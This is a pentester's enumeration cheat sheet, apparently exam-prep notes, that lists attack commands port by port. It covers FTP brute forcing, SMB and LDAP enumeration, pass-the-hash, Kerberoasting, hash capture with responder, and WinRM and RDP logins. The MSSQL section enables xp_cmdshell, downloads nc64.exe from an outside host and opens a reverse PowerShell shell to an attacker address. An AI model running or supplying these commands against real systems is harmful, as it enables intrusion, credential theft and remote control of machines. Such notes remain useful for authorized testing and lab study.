## Enumeration Checklist

<set your variables>
target=
user=
pass=
ip=
domain=

# 21 FTP

hydra -l <user list> -P <password list> ftp://$ip

common creds patterns

admin/admin
root/root
password/password
username/username


#53 DNS

dig @$ip version.bind CHAOS TXT
dig axfr @$ip $domain     
dnsenum $domain

#135 RCP

rpcclient -U '' -N $ip
rpcclient -U '$user%$pass' $ip 

> enumdomusers      #check the users on the DC
> queryuser <username>  #query the details of the user
> querydispinfo 

nmblookup -A $ip

＃445 SMB
<Without Pass>

enum4linux -a $ip
impacket-lookupsid '$domain'/'$user'@$domain -no-pass

smbmap  -H 10.10.10.100 --depth 10 -r   #List Shares
smbclient -N -L //[ip]
smbclient //[ip]/[share] -N   #Enumerate Files


<With Pass>
lookupsid.py  $domain/$user:$pass@$domain

lookupsid.py  #domain/$user:$pass@$ip | grep SidTypeUser | cut -d " " -f 2 | cut -d '\' -f 2     #This oneliner will create a file with all the domain users

psexec.py -hashes  :<ntlm hash>    $user@$ip

smbmap -H  hokkaido-aerospace.com -u info -p info --depth 10 -r

smbclient //$ip/C$ -U '$user%$pass' -c 'dir'

netexec smb [host/ip] -u [user] -p [pass] --shares

netexec smb [host/ip] -u guest -p '' --shares

smbclient //[ip]/[share] -U [username] [password]

netexec smb -u [user] -p [pass] -M spider_plus

smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass - Kerberos auth

manspider.py --threads 256 [IP/CIDR] -u [username] -p [pass] [options]


#88 Kerberoas

nmap --script=krb5-enum-users --script-args='userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt' -p88 $ip

kerbrute  -dc $ip -domain $domain -users <user file>   #check if the uses are valid

impacket-GetNPUsers $domain/$user -dc-ip $ip   #AS Rep; hashcat module 18200 

impacket-GetUserSPNs -request -dc-ip $ip $domain/$user  #Kerberoasting; Kerberoasting module 13100

kerbrute -domain #domain -dc $ip -users /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt 

kerbrute -domain $domain -dc $ip  -users /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100


#389 LDAP

<Without Pass>
ldapsearch -H ldap://$ip -x -b "DC=oscp,DC=exam" 

ldapsearch -x -H ldap://$ip -s base namingcontexts

impacket-lookupsid '$domain/guest'@$domain -no-pass

<With Pass>
lookupsid.py  $domain/$user:$pass@$domain
ldapsearch -x -H ldap://$ip -D '$user' -w '$pass' -s base namingcontexts

bloodhound-python -d $domain -u $user -p $pass -c all -ns $ip
neo4j console                #config file; /usr/share/neo4j/conf
./Bloodhound  --no-sandbox


#1433 MSSQL

impacket-mssqlclient sql_svc:Dolphin1@10.10.138.148 -windows-auth  #Windows login
impacket-mssqlclient sql_svc:Dolphin1@10.10.138.148   #user login

SELECT @@version   #Current MSSQL Version	
SELECT DB_NAME()   #Current Database
SELECT name FROM sys.databases;  #show DBs	
enum_db            #show DBs

select * from   <DB name>.INFORMATION_SCHEMA.TABLES  #show tables  

#cmd command	

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell ' whoami /priv '

xp_cmdshell "certutil -urlcache -f http://192.168.45.247/nc64.exe nc64.exe"  #If cmd command dose not work, upgrade to poershell
xp_cmdshell "powershell -Command "(New-Object Net.WebClient).DownloadFile(''http://10.10.149.147:1235/nc64.exe'',''C:\Windows\Temp\nc64.exe'')"
xp_cmdshell "/windows/temp/nc64.exe 10.10.149.147 1234 -e powershell"
	
hash capture

xp_dirtree \\192.168.1.210\shared
responder -I tun0   #When the SQL service is running under a machine account, the authentication process returns the machine account hash, which is not crackable (e.g., $DC)

enum_impersonate  #impersonate
EXECUTE AS LOGIN = 'username to impersonate'  #impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'  #impersonate


<MSSQL Cheetsheet>

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
https://kwcsec.gitbook.io/the-red-team-handbook/infrastructure/sql/ms-sql/privilege-escalation
https://www.bordergate.co.uk/attacking-mssql/


#3389 RDP

xfreerdp /u:$user /p:$pass /v:$ip /cert:ignore +clipboard

#5985 WINRM

evil-winrm -i $ip -u $user -p $pass
